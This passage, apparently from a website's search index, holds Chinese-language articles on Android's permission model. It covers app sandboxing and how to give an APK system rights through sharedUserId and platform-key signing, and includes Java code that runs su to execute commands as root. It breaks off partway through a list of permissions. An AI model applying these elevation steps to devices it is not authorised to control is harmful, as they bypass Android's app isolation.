\u5343\u4e07\u4e0d\u8981\u770bapk\u6587\u4ef6\u7cfb\u7edf\u4e0a\u5c5e\u4e8esystem/system\u7528\u6237\u53ca\u7528\u6237\u7ec4\uff0c\u6216\u8005root/root\u7528\u6237\u53ca\u7528\u6237\u7ec4\uff0c\u5c31\u8ba4\u4e3aapk\u5177\u6709system\u6216root\u6743\u9650\u3002apk\u7a0b\u5e8f\u662f\u8fd0\u884c\u5728\u865a\u62df\u673a\u4e0a\u7684,\u5bf9\u5e94\u7684\u662fAndroid\u72ec\u7279\u7684\u6743\u9650\u673a\u5236\uff0c\u53ea\u6709\u4f53\u73b0\u5230\u6587\u4ef6\u7cfb\u7edf\u4e0a\u65f6\u624d\u4f7f\u7528linux\u7684\u6743\u9650\u8bbe\u7f6e\u3002 \uff08\u4e8c\uff09Android\u7684\u6743\u9650\u89c4\u5219 \uff081)Android\u4e2d\u7684apk\u5fc5\u987b\u7b7e\u540d \u8fd9\u79cd\u7b7e\u540d\u4e0d\u662f\u57fa\u4e8e\u6743\u5a01\u8bc1\u4e66\u7684\uff0c\u4e0d\u4f1a\u51b3\u5b9a\u67d0\u4e2a\u5e94\u7528\u5141\u4e0d\u5141\u8bb8\u5b89\u88c5\uff0c\u800c\u662f\u4e00\u79cd\u81ea\u7b7e\u540d\u8bc1\u4e66\u3002 \u91cd\u8981\u7684\u662f\uff0candroid\u7cfb\u7edf\u6709\u7684\u6743\u9650\u662f\u57fa\u4e8e\u7b7e\u540d\u7684\u3002\u6bd4\u5982\uff1asystem\u7b49\u7ea7\u7684\u6743\u9650\u6709\u4e13\u95e8\u5bf9\u5e94\u7684\u7b7e\u540d\uff0c\u7b7e\u540d\u4e0d\u5bf9\uff0c\u6743\u9650\u4e5f\u5c31\u83b7\u53d6\u4e0d\u5230\u3002 \u9ed8\u8ba4\u751f\u6210\u7684APK\u6587\u4ef6\u662fdebug\u7b7e\u540d\u7684\u3002\u83b7\u53d6system\u6743\u9650\u65f6\u7528\u5230\u7684\u7b7e\u540d\u89c1\u540e\u9762\u63cf\u8ff0 \uff082\uff09\u57fa\u4e8eUserID\u7684\u8fdb\u7a0b\u7ea7\u522b\u7684\u5b89\u5168\u673a\u5236 \u8fdb\u7a0b\u6709\u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u8fdb\u7a0b\u4e0e\u8fdb\u7a0b\u95f4\u9ed8\u8ba4\u662f\u4e0d\u80fd\u4e92\u76f8\u8bbf\u95ee\u7684\uff0cAndroid\u901a\u8fc7\u4e3a\u6bcf\u4e00\u4e2aapk\u5206\u914d\u552f\u4e00\u7684linux userID\u6765\u5b9e\u73b0\uff0c\u540d\u79f0\u4e3a\"app_\"\u52a0\u4e00\u4e2a\u6570\u5b57\uff0c\u6bd4\u5982app_43\u4e0d\u540c\u7684UserID\uff0c\u8fd0\u884c\u5728\u4e0d\u540c\u7684\u8fdb\u7a0b\uff0c\u6240\u4ee5apk\u4e4b\u95f4\u9ed8\u8ba4\u4fbf\u4e0d\u80fd\u76f8\u4e92\u8bbf\u95ee\u3002 Android\u63d0\u4f9b\u4e86\u5982\u4e0b\u7684\u4e00\u79cd\u673a\u5236\uff0c\u53ef\u4ee5\u4f7f\u4e24\u4e2aapk\u6253\u7834\u524d\u9762\u8bb2\u7684\u8fd9\u79cd\u58c1\u5792\u3002 \u5728AndroidManifest.xml\u4e2d\u5229\u7528sharedUserId\u5c5e\u6027\u7ed9\u4e0d\u540c\u7684package\u5206\u914d\u76f8\u540c\u7684userID\uff0c\u901a\u8fc7\u8fd9\u6837\u505a\uff0c\u4e24\u4e2apackage\u53ef\u4ee5\u88ab\u5f53\u505a\u540c\u4e00\u4e2a\u7a0b\u5e8f\uff0c \u7cfb\u7edf\u4f1a\u5206\u914d\u7ed9\u4e24\u4e2a\u7a0b\u5e8f\u76f8\u540c\u7684UserID\u3002\u5f53\u7136\uff0c\u57fa\u4e8e\u5b89\u5168\u8003\u8651\uff0c\u4e24\u4e2aapk\u9700\u8981\u76f8\u540c\u7684\u7b7e\u540d\uff0c\u5426\u5219\u6ca1\u6709\u9a8c\u8bc1\u4e5f\u5c31\u6ca1\u6709\u610f\u4e49\u4e86\u3002 \uff083\uff09\u9ed8\u8ba4apk\u751f\u6210\u7684\u6570\u636e\u5bf9\u5916\u662f\u4e0d\u53ef\u89c1\u7684 \u5b9e\u73b0\u65b9\u6cd5\u662f\uff1aAndroid\u4f1a\u4e3a\u7a0b\u5e8f\u5b58\u50a8\u7684\u6570\u636e\u5206\u914d\u8be5\u7a0b\u5e8f\u7684UserID\u3002 \u501f\u52a9\u4e8eLinux\u4e25\u683c\u7684\u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee\u6743\u9650\uff0c\u4fbf\u5b9e\u73b0\u4e86apk\u4e4b\u95f4\u4e0d\u80fd\u76f8\u4e92\u8bbf\u95ee\u4f3c\u6709\u6570\u636e\u7684\u673a\u5236\u3002 \u4f8b\uff1a\u6211\u7684\u5e94\u7528\u521b\u5efa\u7684\u4e00\u4e2a\u6587\u4ef6\uff0c\u9ed8\u8ba4\u6743\u9650\u5982\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230\u53ea\u6709UserID\u4e3aapp_21\u7684\u7a0b\u5e8f\u624d\u80fd\u8bfb\u5199\u8be5\u6587\u4ef6\u3002 -rw------- app_21 app_21 87650 2000-01-01 09:48 test.txt \u5982\u4f55\u5bf9\u5916\u5f00\u653e\uff1f <1> \u4f7f\u7528MODE_WORLD_READABLE and/or MODE_WORLD_WRITEABLE\u6807\u8bb0\u3002 When creating a new file with getSharedPreferences(String, int), openFileOutput(String, int), or openOrCreateDatabase(String, int, SQLiteDatabase.CursorFactory), you can use the MODE_WORLD_READABLE and/or MODE_WORLD_WRITEABLE flags to allow any other package to read/write the file. When setting these flags, the file is still owned by your application, but its global read and/or write permissions have been set appropriately so any other application can see it. \uff084\uff09AndroidManifest.xml\u4e2d\u7684\u663e\u5f0f\u6743\u9650\u58f0\u660e Android\u9ed8\u8ba4\u5e94\u7528\u662f\u6ca1\u6709\u4efb\u4f55\u6743\u9650\u53bb\u64cd\u4f5c\u5176\u4ed6\u5e94\u7528\u6216\u7cfb\u7edf\u76f8\u5173\u7279\u6027\u7684\uff0c\u5e94\u7528\u5728\u8fdb\u884c\u67d0\u4e9b\u64cd\u4f5c\u65f6\u90fd\u9700\u8981\u663e\u5f0f\u5730\u53bb\u7533\u8bf7\u76f8\u5e94\u7684\u6743\u9650\u3002 \u4e00\u822c\u4ee5\u4e0b\u52a8\u4f5c\u65f6\u90fd\u9700\u8981\u7533\u8bf7\u76f8\u5e94\u7684\u6743\u9650\uff1a A particular permission may be enforced at a number of places during your program's operation: At the time of a call into the system, to prevent an application from executing certain functions.When starting an activity, to prevent applications from launching activities of other applications.Both sending and receiving broadcasts, to control who can receive your broadcast or who can send a broadcast to you.When accessing and operating on a content provider.Binding or starting a service. \u5728\u5e94\u7528\u5b89\u88c5\u7684\u65f6\u5019\uff0cpackage installer\u4f1a\u68c0\u6d4b\u8be5\u5e94\u7528\u8bf7\u6c42\u7684\u6743\u9650\uff0c\u6839\u636e\u8be5\u5e94\u7528\u7684\u7b7e\u540d\u6216\u8005\u63d0\u793a\u7528\u6237\u6765\u5206\u914d\u76f8\u5e94\u7684\u6743\u9650\u3002 \u5728\u7a0b\u5e8f\u8fd0\u884c\u671f\u95f4\u662f\u4e0d\u68c0\u6d4b\u6743\u9650\u7684\u3002\u5982\u679c\u5b89\u88c5\u65f6\u6743\u9650\u83b7\u53d6\u5931\u8d25\uff0c\u90a3\u6267\u884c\u5c31\u4f1a\u51fa\u9519\uff0c\u4e0d\u4f1a\u63d0\u793a\u7528\u6237\u6743\u9650\u4e0d\u591f\u3002 \u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6743\u9650\u4e0d\u8db3\u5bfc\u81f4\u7684\u5931\u8d25\u4f1a\u5f15\u53d1\u4e00\u4e2a SecurityException\uff0c\u4f1a\u5728\u7cfb\u7edflog\uff08system log\uff09\u4e2d\u6709\u76f8\u5173\u8bb0\u5f55\u3002 \uff085\uff09\u6743\u9650\u7ee7\u627f/UserID\u7ee7\u627f \u5f53\u6211\u4eec\u9047\u5230apk\u6743\u9650\u4e0d\u8db3\u65f6\uff0c\u6211\u4eec\u6709\u65f6\u4f1a\u8003\u8651\u5199\u4e00\u4e2alinux\u7a0b\u5e8f\uff0c\u7136\u540e\u7531apk\u8c03\u7528\u5b83\u53bb\u5b8c\u6210\u67d0\u4e2a\u5b83\u6ca1\u6709\u6743\u9650\u5b8c\u6210\u7684\u4e8b\u60c5\uff0c\u5f88\u9057\u61be\uff0c\u8fd9\u79cd\u65b9\u6cd5\u662f\u884c\u4e0d\u901a\u7684\u3002 \u524d\u9762\u8bb2\u8fc7\uff0candroid\u6743\u9650\u662f\u5728\u8fdb\u7a0b\u5c42\u9762\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e00\u4e2aapk\u5e94\u7528\u542f\u52a8\u7684\u5b50\u8fdb\u7a0b\u7684\u6743\u9650\u4e0d\u53ef\u80fd\u8d85\u8d8a\u5176\u7236\u8fdb\u7a0b\u7684\u6743\u9650\uff08\u5373apk\u7684\u6743\u9650\uff09\uff0c \u5373\u4f7f\u5355\u72ec\u8fd0\u884c\u67d0\u4e2a\u5e94\u7528\u6709\u6743\u9650\u505a\u67d0\u4e8b\uff0c\u4f46\u5982\u679c\u5b83\u662f\u7531\u4e00\u4e2aapk\u8c03\u7528\u7684\uff0c\u90a3\u6743\u9650\u5c31\u4f1a\u88ab\u9650\u5236\u3002 \u5b9e\u9645\u4e0a\uff0candroid\u662f\u901a\u8fc7\u7ed9\u5b50\u8fdb\u7a0b\u5206\u914d\u7236\u8fdb\u7a0b\u7684UserID\u5b9e\u73b0\u8fd9\u4e00\u673a\u5236\u7684\u3002 \uff08\u4e09\uff09\u5e38\u89c1\u6743\u9650\u4e0d\u8db3\u95ee\u9898\u5206\u6790 \u9996\u5148\u8981\u77e5\u9053\uff0c\u666e\u901aapk\u7a0b\u5e8f\u662f\u8fd0\u884c\u5728\u975eroot\u3001\u975esystem\u5c42\u7ea7\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u770b\u8981\u8bbf\u95ee\u7684\u6587\u4ef6\u7684\u6743\u9650\u65f6\uff0c\u770b\u7684\u662f\u6700\u540e\u4e09\u4f4d\u3002 \u53e6\u5916\uff0c\u901a\u8fc7system/app\u5b89\u88c5\u7684apk\u7684\u6743\u9650\u4e00\u822c\u6bd4\u76f4\u63a5\u5b89\u88c5\u6216adb install\u5b89\u88c5\u7684apk\u7684\u6743\u9650\u8981\u9ad8\u4e00\u4e9b\u3002 \u8a00\u5f52\u6b63\u4f20\uff0c\u8fd0\u884c\u4e00\u4e2aandroid\u5e94\u7528\u7a0b\u5e8f\u8fc7\u7a0b\u4e2d\u9047\u5230\u6743\u9650\u4e0d\u8db3\uff0c\u4e00\u822c\u5206\u4e3a\u4e24\u79cd\u60c5\u51b5: \uff081\uff09Log\u4e2d\u53ef\u660e\u663e\u770b\u5230\u6743\u9650\u4e0d\u8db3\u7684\u63d0\u793a\u3002 \u6b64\u79cd\u60c5\u51b5\u4e00\u822c\u662fAndroidManifest.xml\u4e2d\u7f3a\u5c11\u76f8\u5e94\u7684\u6743\u9650\u8bbe\u7f6e\uff0c\u597d\u597d\u67e5\u627e\u4e00\u756a\u6743\u9650\u5217\u8868\uff0c\u5e94\u8be5\u5c31\u53ef\u89e3\u51b3\uff0c\u662f\u6700\u6613\u5904\u7406\u7684\u60c5\u51b5\u3002 \u6709\u65f6\u6743\u9650\u90fd\u52a0\u4e0a\u4e86\uff0c\u4f46\u8fd8\u662f\u62a5\u6743\u9650\u4e0d\u8db3\uff0c\u662f\u4ec0\u4e48\u60c5\u51b5\u5462\uff1f Android\u7cfb\u7edf\u6709\u4e00\u4e9bAPI\u53ca\u6743\u9650\u662f\u9700\u8981apk\u5177\u6709\u4e00\u5b9a\u7684\u7b49\u7ea7\u624d\u80fd\u8fd0\u884c\u7684\u3002 \u6bd4\u5982 SystemClock.setCurrentTimeMillis()\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\uff0cWRITE_SECURE_SETTINGS\u6743\u9650\u597d\u50cf\u90fd\u662f\u9700\u8981\u6709system\u7ea7\u7684\u6743\u9650\u624d\u884c\u3002 \u4e5f\u5c31\u662f\u8bf4UserID\u662fsystem. \uff082\uff09Log\u91cc\u6ca1\u6709\u62a5\u6743\u9650\u4e0d\u8db3\uff0c\u800c\u662f\u4e00\u4e9b\u5176\u4ed6Exception\u7684\u63d0\u793a,\u8fd9\u4e5f\u6709\u53ef\u80fd\u662f\u6743\u9650\u4e0d\u8db3\u9020\u6210\u7684\u3002 \u6bd4\u5982\uff1a\u6211\u4eec\u5e38\u4f1a\u60f3\u8bfb/\u5199\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u6216\u5176\u4ed6\u4e00\u4e9b\u4e0d\u662f\u81ea\u5df1\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u5e38\u4f1a\u62a5java.io.FileNotFoundException\u9519\u8bef\u3002 \u7cfb\u7edf\u8ba4\u4e3a\u6bd4\u8f83\u91cd\u8981\u7684\u6587\u4ef6\u4e00\u822c\u6743\u9650\u8bbe\u7f6e\u7684\u4e5f\u4f1a\u6bd4\u8f83\u4e25\u683c\uff0c\u7279\u522b\u662f\u4e00\u4e9b\u5f88\u91cd\u8981\u7684(\u914d\u7f6e)\u6587\u4ef6\u6216\u76ee\u5f55\u3002 \u5982 -r--r----- bluetooth bluetooth 935 2010-07-09 20:21 dbus.conf drwxrwx--x system system 2010-07-07 02:05 data dbus.conf\u597d\u50cf\u662f\u84dd\u7259\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u4ece\u6743\u9650\u4e0a\u6765\u770b\uff0c\u6839\u672c\u5c31\u4e0d\u53ef\u80fd\u6539\u52a8\uff0c\u975ebluetooth\u7528\u6237\u8fde\u8bfb\u7684\u6743\u5229\u90fd\u6ca1\u6709\u3002 /data\u76ee\u5f55\u4e0b\u5b58\u7684\u662f\u6240\u6709\u7a0b\u5e8f\u7684\u79c1\u6709\u6570\u636e\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0bandroid\u662f\u4e0d\u5141\u8bb8\u666e\u901aapk\u8bbf\u95ee/data\u76ee\u5f55\u4e0b\u5185\u5bb9\u7684\uff0c\u901a\u8fc7data\u76ee\u5f55\u7684\u6743\u9650\u8bbe\u7f6e\u53ef\u77e5\uff0c\u5176\u4ed6\u7528\u6237\u6ca1\u6709\u8bfb\u7684\u6743\u9650\u3002 \u6240\u4ee5adb\u666e\u901a\u6743\u9650\u4e0b\u5728data\u76ee\u5f55\u4e0b\u6572ls\u547d\u4ee4\uff0c\u4f1a\u5f97\u5230 opendir failed, Permission denied \u7684\u9519\u8bef\uff0c\u901a\u8fc7\u4ee3\u7801file.listfiles()\u4e5f\u65e0\u6cd5\u83b7\u5f97data\u76ee\u5f55\u4e0b\u7684\u5185\u5bb9\u3002 \u4e0a\u9762\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u822c\u90fd\u9700\u8981\u63d0\u5347apk\u7684\u6743\u9650\uff0c\u76ee\u524d\u6211\u6240\u77e5\u7684apk\u80fd\u63d0\u5347\u5230\u7684\u6743\u9650\u5c31\u662fsystem\uff08\u5177\u4f53\u65b9\u6cd5\u89c1\uff1a\u5982\u4f55\u4f7fAndroid\u5e94\u7528\u7a0b\u5e8f\u83b7\u53d6\u7cfb\u7edf\u6743\u9650\uff09,","title":"Android\u6743\u9650\u8bf4\u660e"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#android-apk-system","text":"\u6700\u8fd1\u5728\u56de\u7b54\u5ba2\u6237\u7684\u95ee\u9898\u65f6\uff0c\u63d0\u5230\u600e\u4e48\u5c06apk \u5347\u7ea7\u5230root\u6743\u9650\u3002 1.\u4e00\u822c\u6743\u9650\u7684\u6dfb\u52a0 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8bbe\u5b9aapk\u7684\u6743\u9650\uff0c\u53ef\u5728AndroidManifest.xml\u4e2d\u6dfb\u52a0android:sharedUserId=\"android.uid.xxx> \u4f8b\u5982\uff1a \u7ed9apk\u6dfb\u52a0system\u6743\u9650 <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" ... ... android:sharedUserId=\"android.uid.system\"> \u540c\u65f6\u8fd8\u9700\u8981\u5728\u5bf9\u5e94\u7684Android.mk\u4e2d\u6dfb\u52a0LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u9879\u3002\u5373\u7528\u7cfb\u7edf\u7684\u7b7e\u540d\uff0c\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u53ea\u80fd\u4f7fapk\u7684\u6743\u9650\u5347\u7ea7\u5230system\u7ea7\u522b\uff0c\u7cfb\u7edf\u4e2d\u8981\u6c42root\u6743\u9650\u624d\u80fd\u8bbf\u95ee\u7684\u6587\u4ef6\uff0capk\u8fd8\u662f\u4e0d\u80fd\u8bbf\u95ee\u3002 \u6bd4\u5982\u5728android \u7684API\u4e2d\u6709\u63d0\u4f9b SystemClock.setCurrentTimeMillis()\u51fd\u6570\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\uff0c\u8fd9\u4e2a\u51fd\u6570\u9700\u8981root\u6743\u9650\u6216\u8005\u8fd0\u884c\u4e0e\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u624d\u53ef\u4ee5\u7528\u3002 \u7b2c\u4e00\u4e2a\u65b9\u6cd5\u7b80\u5355\u70b9\uff0c\u4e0d\u8fc7\u9700\u8981\u5728Android\u7cfb\u7edf\u6e90\u7801\u7684\u73af\u5883\u4e0b\u7528make\u6765\u7f16\u8bd1\uff1a 1. \u5728\u5e94\u7528\u7a0b\u5e8f\u7684AndroidManifest.xml\u4e2d\u7684manifest\u8282\u70b9\u4e2d\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4fee\u6539Android.mk\u6587\u4ef6\uff0c\u52a0\u5165LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u884c 3. \u4f7f\u7528mm\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u751f\u6210\u7684apk\u5c31\u6709\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u7684\u6743\u9650\u4e86\u3002 \u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u662f\u76f4\u63a5\u628aeclipse\u7f16\u51fa\u6765\u7684apk\u7528\u7cfb\u7edf\u7684\u7b7e\u540d\u6587\u4ef6\u7b7e\u540d 1. \u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4f7f\u7528eclipse\u7f16\u8bd1\u51faapk\u6587\u4ef6\u3002 3. \u4f7f\u7528\u76ee\u6807\u7cfb\u7edf\u7684platform\u5bc6\u94a5\u6765\u91cd\u65b0\u7ed9apk\u6587\u4ef6\u7b7e\u540d\u3002\u9996\u5148\u627e\u5230\u5bc6\u94a5\u6587\u4ef6\uff0c\u5728\u6211ndroid\u6e90\u7801\u76ee\u5f55\u4e2d\u7684\u4f4d\u7f6e\u662f\"build/target/product/security\"\uff0c\u4e0b\u9762\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7136\u540e\u7528Android\u63d0\u4f9b\u7684Signapk\u5de5\u5177\u6765\u7b7e\u540d\uff0csignapk\u7684\u6e90\u4ee3\u7801\u662f\u5728\"build/tools/signapk\"\u4e0b\uff0c\u7f16\u8bd1\u540e\u5728out/host/linux-x86/framework\u4e0b\uff0c\u7528\u6cd5\u4e3ajava -jar signapk.jar platform.x509.pem platform.pk8 input.apk output.apk\"\u3002 \u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002\u901a\u8fc7Shared User id,\u62e5\u6709\u540c\u4e00\u4e2aUser id\u7684\u591a\u4e2aAPK\u53ef\u4ee5\u914d\u7f6e\u6210\u8fd0\u884c\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u3002\u90a3\u4e48\u628a\u7a0b\u5e8f\u7684UID\u914d\u6210android.uid.system\uff0c\u4e5f\u5c31\u662f\u8981\u8ba9\u7a0b\u5e8f\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\uff0c\u8fd9\u6837\u5c31\u6709\u6743\u9650\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u4e86\u3002 \u53ea\u662f\u52a0\u5165UID\u8fd8\u4e0d\u591f\uff0c\u5982\u679c\u8fd9\u65f6\u5019\u5b89\u88c5APK\u7684\u8bdd\u53d1\u73b0\u65e0\u6cd5\u5b89\u88c5\uff0c\u63d0\u793a\u7b7e\u540d\u4e0d\u7b26\uff0c\u539f\u56e0\u662f\u7a0b\u5e8f\u60f3\u8981\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u8fd8\u8981\u6709\u76ee\u6807\u7cfb\u7edf\u7684platform key\uff0c\u5c31\u662f\u4e0a\u9762\u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u63d0\u5230\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7528\u8fd9\u4e24\u4e2akey\u7b7e\u540d\u540eapk\u624d\u771f\u6b63\u53ef\u4ee5\u653e\u5165\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u3002\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u4e2d\u52a0\u5165LOCAL_CERTIFICATE := platform\u5176\u5b9e\u5c31\u662f\u7528\u8fd9\u4e24\u4e2akey\u6765\u7b7e\u540d\u3002 \u8fd9\u4e5f\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u8fd9\u6837\u751f\u6210\u7684\u7a0b\u5e8f\u53ea\u6709\u5728\u539f\u59cb\u7684Android\u7cfb\u7edf\u6216\u8005\u662f\u81ea\u5df1\u7f16\u8bd1\u7684\u7cfb\u7edf\u4e2d\u624d\u53ef\u4ee5\u7528\uff0c\u56e0\u4e3a\u8fd9\u6837\u7684\u7cfb\u7edf\u624d\u53ef\u4ee5\u62ff\u5230platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u8981\u662f\u522b\u5bb6\u516c\u53f8\u505a\u7684Android\u4e0a\u8fde\u5b89\u88c5\u90fd\u5b89\u88c5\u4e0d\u4e86\u3002\u8bd5\u8bd5\u539f\u59cb\u7684Android\u4e2d\u7684key\u6765\u7b7e\u540d\uff0c\u7a0b\u5e8f\u5728\u6a21\u62df\u5668\u4e0a\u8fd0\u884cOK\uff0c\u4e0d\u8fc7\u653e\u5230G3\u4e0a\u5b89\u88c5\u76f4\u63a5\u63d0\u793a\"Package ... has no signatures that match those in shared user android.uid.system\"\uff0c\u8fd9\u6837\u4e5f\u662f\u4fdd\u62a4\u4e86\u7cfb\u7edf\u7684\u5b89\u5168\u3002","title":"\u600e\u6837\u4f7fandroid apk  \u83b7\u53d6system\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#android-apk-root","text":"\u4e00\u822clinux \u83b7\u53d6root\u6743\u9650\u662f\u901a\u8fc7\u6267\u884csu\u547d\u4ee4\uff0c\u90a3\u80fd\u4e0d\u80fd\u5728apk\u7a0b\u5e8f\u4e2d\u4e5f\u540c\u6837\u6267\u884c\u4e00\u4e0b\u8be5\u547d\u4ee4\u5462\uff0c\u6211\u4eec\u77e5\u9053\u5728linux\u7f16\u7a0b\u4e2d\uff0c\u6709exec\u51fd\u6570\u65cf\uff1a \u3000\u3000int execl(c[ON](http://www.dzsc.com/data/iccompany/detail12.html)st char *path, const char *arg, ...); \u3000\u3000int execlp(const char *file, const char *arg, ...); \u3000\u3000int execle(const char *path, const char *arg, ..., char *const envp[]); \u3000\u3000int execv(const char *path, char *const argv[]); \u3000\u3000int execvp(const char *file, char *const argv[]); \u3000\u3000int execve(const char *path, char *const argv[], char *const envp[]); \u5728java\u4e2d\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\ufeff\ufeff\ufeff\ufeff\ufeff\ufeff\ufeff\ufeff Runtime.getRuntime().exec([String](http://www.coderanch.com/t/410859/java/java/String-StringBuffer-StringBuilder-Performance \"String vs. StringBuilder/StringBuffer\") command) \u8bbf\u95ee\u5e95\u5c42Linux\u4e0b\u7684\u7a0b\u5e8f\u6216\u811a\u672c\uff0c\u8fd9\u6837\u5c31\u80fd\u6267\u884csu\u547d\u4ee4\uff0c\u4f7fapk\u5177\u6709root\u6743\u9650\uff0c\u80fd\u591f\u8bbf\u95ee\u7cfb\u7edf\u4e2d\u9700\u8981root\u6743\u9650\u624d\u80fd\u6267\u884c\u7684\u7a0b\u5e8f\u6216\u811a\u672c\u4e86\uff0c\u5177\u4f53\u4f8b\u5b50\uff1a package com.visit.dialoglog; import java.io.DataInputStream; import java.io.DataOutputStream; import java.io.IOException; import android.app.Activity; import android.os.Bundle; import android.util.Log; public class VisitRootfileActivity extends Activity { private static final String TAG = \"VisitRootfileActivity\"; Process process = null; Process process1 = null; DataOutputStream os = null; DataInputStream is = null; /** Called when the activity is first created. */ @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main); try { process = Runtime.getRuntime().exec(\"/system/xbin/su\"); /*\u8fd9\u91cc\u53ef\u80fd\u9700\u8981\u4fee\u6539su \u7684\u6e90\u4ee3\u7801 \uff08\u6ce8\u6389 if (myuid != AID_ROOT && myuid != AID_SHELL) {*/ os = new DataOutputStream(process.getOutputStream()); is = new DataInputStream(process.getInputStream()); os.writeBytes(\"/system/bin/ls\" + \" \\n\"); //\u8fd9\u91cc\u53ef\u4ee5\u6267\u884c\u5177\u6709root \u6743\u9650\u7684\u7a0b\u5e8f\u4e86 os.writeBytes(\" exit \\n\"); os.flush(); process.waitFor(); } catch (Exception e) { Log.e(TAG, \"Unexpected error - Here is what I know:\" + e.getMessage()); } finally { try { if (os != null) { os.close(); } if (is != null) { is.close(); } process.destroy(); } catch (Exception e) { } }// get the root privileges } }","title":"\u600e\u6837\u4f7fandroid apk  \u83b7\u53d6root\u6743\u9650"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/#apkandroidmanifestxml","text":"android.permission.ACCESS_CHECKIN_PROPERTIES //\u5141\u8bb8\u8bfb\u5199\u8bbf\u95ee\u201dproperties\u201d\u8868\u5728checkin\u6570\u636e\u5e93\u4e2d\uff0c\u6539\u503c\u53ef\u4ee5\u4fee\u6539\u4e0a\u4f20 android.permission.ACCESS_COARSE_LOCATION //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbf\u95eeCellID\u6216WiFi\u70ed\u70b9\u6765\u83b7\u53d6\u7c97\u7565\u7684\u4f4d\u7f6e android.permission.ACCESS_FINE_LOCATION //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u8bbf\u95ee\u7cbe\u826f\u4f4d\u7f6e(\u5982GPS) android.permission.ACCESS_LOCATION_EXTRA_COMMANDS //\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee\u989d\u5916\u7684\u4f4d\u7f6e\u63d0\u4f9b\u547d\u4ee4 android.permission.ACCESS_MOCK_LOCATION //\u5141\u8bb8\u7a0b\u5e8f\u521b\u5efa\u6a21\u62df\u4f4d\u7f6e\u63d0\u4f9b\u7528\u4e8e\u6d4b\u8bd5 android.permission.ACCESS_NETWORK_STATE //\u5141\u8bb8\u7a0b\u5e8f\u8bbf\u95ee\u6709\u5173GSM\u7f51\u7edc\u4fe1\u606f android.permission.ACCESS_SURFACE_FLINGER //\u5141\u8bb8\u7a0b\u5e8f\u4f7f\u7528SurfaceFlinger\u5e95\u5c42\u7279\u6027 android.permission.ACCESS_WIFI_STATE //\u5141\u8bb8\u7a0b\u5e8f\u8bbf\u95eeWi-Fi\u7f51\u7edc\u72b6\u6001\u4fe1\u606f android.permission.ADD_SYSTEM_SERVICE //\u5141\u8bb8\u7a0b\u5e8f\u53d1\u5e03\u7cfb\u7edf\u7ea7\u670d\u52a1 android.permission.BATTERY_STATS //\u5141\u8bb8\u7a0b\u5e8f\u66f4\u65b0\u624b\u673a\u7535\u6c60\u7edf\u8ba1\u4fe1\u606f android.permission.BLUETOOTH //\u5141\u8bb8\u7a0b\u5e8f\u8fde\u63a5\u5230\u5df2\u914d\u5bf9\u7684\u84dd\u7259\u8bbe\u5907 android.permission.BLUETOOTH_ADMIN //\u5141\u8bb8\u7a0b\u5e8f\u53d1\u73b0\u548c\u914d\u5bf9\u84dd\u7259\u8bbe\u5907 android.permission.BRICK //\u8bf7\u6c42\u80fd\u591f\u7981\u7528\u8bbe\u5907(\u975e\u5e38\u5371\u9669 android.permission.BROADCAST_PACKAGE_REMOVED //\u5141\u8bb8\u7a0b\u5e8f\u5e7f\u64ad\u4e00\u4e2a\u63d0\u793a\u6d88\u606f\u5728\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5305\u5df2\u7ecf\u79fb\u9664\u540e android.permission.BROADCAST_STICKY //\u5141\u8bb8\u4e00\u4e2a\u7a0b\u5e8f\u5e7f\u64ad\u5e38\u7528intents android.permission.CALL_PHONE 